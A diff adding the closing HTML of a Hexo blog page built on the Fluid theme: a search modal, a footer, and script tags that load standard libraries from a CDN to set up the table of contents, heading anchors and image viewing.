+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
